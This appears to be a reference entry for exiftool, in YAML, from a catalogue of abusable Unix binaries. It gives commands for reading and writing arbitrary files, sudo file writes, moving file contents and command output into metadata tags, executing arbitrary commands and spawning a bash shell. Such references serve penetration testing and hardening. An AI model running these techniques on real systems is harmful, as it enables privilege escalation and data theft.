---
description: |
  If the permissions allow it, files are moved (instead of copied) to the destination.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        OUTPUT=output_file
        exiftool -filename=$OUTPUT $LFILE
        cat $OUTPUT
    - description: Exfiltrate file data via metadata tags
      code: |
        LFILE=file_read
        INPUT=input_file
        exiftool "-description<=$LFILE" --filename $INPUT
  file-write:
    - code: |
        LFILE=file_to_write
        INPUT=input_file
        exiftool -filename=$LFILE $INPUT
    - description: Write file from metadata tag's content
      code: |
        LFILE=file_to_write
        INPUT=input_file
        exiftool -description -W $LFILE --filename $INPUT
  sudo:
    - code: |
        LFILE=file_to_write
        INPUT=input_file
        sudo exiftool -filename=$LFILE $INPUT
  command:
    - code: |
        COMMAND=command_to_execute
        INPUT=input_file
        exiftool -if "system('$COMMAND');1" --filename $INPUT
    - description: Run system command and exfiltrate result via metadata tags
      code: |
        COMMAND=command_to_execute
        INPUT=input_file
        exiftool -userparam "inj=Test" -if "\$\$self{OPTIONS}{UserParam}{inj}=\`$COMMAND\`;1" '-description<$inj' --filename $INPUT
  shell:
    - code: |
      INPUT=input_file
      exiftool -if "system('bash')" $INPUT
---
